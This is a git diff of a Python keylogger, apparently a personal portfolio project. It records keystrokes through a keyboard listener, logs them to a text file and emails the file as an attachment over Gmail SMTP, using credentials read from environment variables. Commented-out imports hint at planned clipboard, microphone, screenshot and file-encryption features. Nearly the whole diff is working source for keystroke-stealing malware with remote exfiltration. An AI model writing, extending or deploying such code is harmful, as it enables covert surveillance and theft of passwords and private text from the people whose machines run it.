@@ -17,139 +17,247 @@ import smtplib
 import socket
 import platform
 
+# Clipboard functionality import.
+# import win32clipboard
+
 # Used to track internal time.
 import time
-import os
+
+# Microphone functionality.
+# from scipy.io.wavfile import write
+# import sounddevice as sd
+
+# File encryption functionality.
+# from cryptography.fernet import Fernet 
 
 # Getpass library to capture username.
 import getpass
 
+# Requests libary to get system information.
+# from requests import get
+
 # Screenshot functionality, using multiprocessing freeze support to capture one screenshot at a time.
 from multiprocessing import Process, freeze_support
+# from PIL import ImageGrab
+
+# Operating System
+import os
+
+# datetime import
+from datetime import datetime
 
 # ===============================================================
 # VARIABLES |
 # ===========
 
+# --- Key Capture ---
+
 # Text file.
-keyFile = "keyFile.txt"
+keyFile = "keyfile.txt"
 
 # Text file location.
-filePath = "E:\\Portfolio\\Keylogger\\Keylogger-Git\\"
+filePath = "E:\\Portfolio\\Keylogger\\Keylogger-Git"
 extend = "\\"
 
+# List to hold keys - Testing Purposes.
+# keysList = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
+
+# List to hold keys.
+keysList = []
+
+# Counts how many keys need to be stored before the list is written.
 count = 0
-keys = []
+
+# --- Email Authentication ---
+
+# Authentication capture variables removed before uploading to github.
+
+# Email address of the sender.
+email_from = os.environ.get('')
+
+# Email password, secured via Windows 11 enviromental variables settings.
+authenticated_password = os.environ.get('')
+
+# Email address of the reciever.
+email_to = os.environ.get('')
+
+# Email subject line.
+email_subject = "Keylogger - [Subject not captured]"
 
 # ===============================================================
 # SCRIPT START |
 # ==============
 
-""" # The keyPressed method takes in the keypresses captured as a parameter called "key".
+# ---------------------------------------------------------------
+# Records key presses as they happen.
 def keyPressed(key):
 
-    # Prints the current key capture to the terminal.
-    print(str(key))
+    # Exits script is escape key pressed.
+    if key == keyboard.Key.esc:
 
-    # Appends the current key capture to the key array.
-    keys.append(key)
+        print("Terminating Script")
+        return False
 
-    # Increases the keys array count by 1.
-    count += 1
+    try:
 
-    # If 
-    if count >= 1:
-        count = orwrite_file(keys)
-        keys = []
+        # Adds a key press to the list.
+        keysList.append(key)
 
-#
-def writeToFile(keys):
+        # Monitors the length of the list.
+        count = len(keysList)
 
-    # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
-    with open(filePath + extend + keyFile, 'a') as logKey:
+        # If the length of the list goes over a certain value, the list is stored into file and the current working list is wiped clear.
+        if count > 50:
 
-        # Loop to check collected inputs for needed corrections, prior to text file formatting.
-        for key in keys:
+            # Cleans the list.
+            keyCleaning(keysList)
+            count = 0
+            keysList.clear()
 
-            # Removes any quotation marks.
-            k = str(key).replace("'", "")
+            # Adds computer information to the file.
 
-            # Moves each word to a new line every time the spacebar is pressed.
-            if k.find("space") > 0:
-                logKey.write('\n')
-                logKey.close()
 
-#
-def keyCleaning(keys):
+            # Sends off the information via email.
+            sendEmail(keyFile, filePath + extend + keyFile, email_from)
+
+    except:
+            
+        # Prints error message.
+        print("ERROR: Unable to capture key.")
+
+# ---------------------------------------------------------------
+# Writes the string of keys to the file.
+def writeToFile(keysList):
+
+    # Don't forget to declare your local variables.. again.
+    keyString = ""
+    timestamp = datetime.now()
+    title = "Captured Keys - {}\n\n".format(timestamp)
+
+    try:
+
+        # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
+        with open(filePath + extend + keyFile, 'a') as logKey:
+
+            logKey.write(title)
+
+            # List comprehension.
+            keyString = "".join([str(key).replace("'", "") for key in keysList])
+
+            # Writes the string to the file.
+            logKey.write(keyString)
+            logKey.write("\n\n========================================\n\n")
+            print("Keys Saved")
+
+    except:
+
+        #
+        print("ERROR: Couldn't write to file.")
+
+    return
+
+# ---------------------------------------------------------------
+# Takes in the raw key list and cleans up the keys captured before moving them to the writeToFile function as a string for saving to a file.
+def keyCleaning(keysList):
+
+    try:
+
+        # Cleaning list.
+        for index, key in enumerate(keysList):
+
+            # CHECK 01: spaces
+            if key == keyboard.Key.space:
+
+                # Takes the current element by its index and changes it, the index was captured in the enumerate clause.
+                keysList[index] = " "
+
+        # Write cleaned list to file.
+        print("Keys Cleaned")
+        writeToFile(keysList)
+
+    except:
+
+        #
+        print("ERROR: Couldn't clean list.")
+
+    return
+
+# ---------------------------------------------------------------
+def sendEmail(fileName, pathToFile, destination):
+    
+    #
+    print("email function start")
+
+    # Incorporated email address.
+    address = destination
+
+    # Allows the formatting of email messages to support a wider range of formats, such as video, image, audio, character texts, email attachments etc.
+    message = MIMEMultipart()
+
+    # Creates a unique subject line
+    #email_subject = datetime.now()
+
+    # 
+    message['From'] = address
+    message['To'] = email_to
+    message['Subject'] = email_subject
+
+    # Email body.
+    body = "Email Body"
+
+    # Enters the "Email body" defined above to the email.
+    message.attach(MIMEText(body, 'plain'))
+
+    # Grabs the file.
+    filename = fileName
+
+    # Attachment creation, opens the attachment and reads it in binary, hence 'rb'
+    attachment = open(pathToFile, 'rb')
+
+    # New instance of MIMEBase, named base.
+    base = MIMEBase('application', 'octet-stream')
+
+    # Changes the payload into an encoded form.
+    base.set_payload((attachment).read())
+
+    # Encodes into base64.
+    encoders.encode_base64(base)
+
+    # Creates the header.
+    base.add_header('Content-Disposition', "attachment: filename = %s" % filename)
+
+    # Attaches the instance of base to the instance of message.
+    message.attach(base)
+
+    # --- Creating SMTP session ---
+
+    # 587 is the port number for gmail.
+    mail = smtplib.SMTP('smtp.gmail.com', 587)
+
+    # Secured via TLS.
+    mail.starttls()
+
+    # Login process.
+    mail.login(email_from, authenticated_password) # <--- Stops here.
+
+    # Converting the message into a simple string.
+    mailText = message.as_string()
+
+    # Sends the email.
+    mail.sendmail(email_from, email_to, mailText)
+
+    # Session termination.
+    mail.quit()
 
     #
+    print("email sent")
 
-# Formally exiting out of the keylogger program
-def on_release(key):
-
-    if key == Key.esc:
-
-        return False
-    
-# Listener function
-with Listener(on_press=on_press, on_release) as listener
-
-    listener.join()
-
- """
-
-# ===============================================================
-
-# Packages up the captured string and sends it off via email.
-def emailPackage():
-
-    # Here
-    print("")
-
-# The keyPressed method takes in the keypresses captured in the "main" method as a parameter called "key".
-def keyPressed(key):
-
-    # Printing the parameter input to the terminal.
-    print(str(key))
-
-    # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
-    with open("keyfile.txt", 'a') as logKey:
-
-        # List of non-numerical and non-alphabetical keys that can be logged.
-        try:
-
-            # Spacebar.
-            if key == keyboard.Key.space:
-                char = " "
-                logKey.write(char)
-
-            # Main enter key
-            elif key == keyboard.Key.enter:
-                char = "[Enter]"
-                logKey.write(char)
-
-            # Backspace
-            elif key == keyboard.Key.backspace:
-                char = "[Backspace]"
-                logKey.write(char)
-
-            # Left control key (checking if the program was terminated via the terminal line).
-            elif key == keyboard.Key.ctrl_l:
-                char = "[left ctrl]"
-                logKey.write(char)
-
-            # Numerical and alphabetical key logging.
-            else:
-                char = key.char
-                logKey.write(char)
-
-        except:
-            print("ERROR: Unable to record char")
-
-# Main function
+# ---------------------------------------------------------------
+# Starts the script.
 def main():
 
-    print("[START]")
+    # TESTING for terminal functionality.
+    print("Starting Script")
 
     # The listener object, the "on_press" method passes the keyboard inputs to the method keyPressed via its "key" parameter.
     listener = keyboard.Listener(on_press=keyPressed)
@@ -161,3 +269,4 @@ def main():
 if __name__ == "__main__":
 
     main()
+
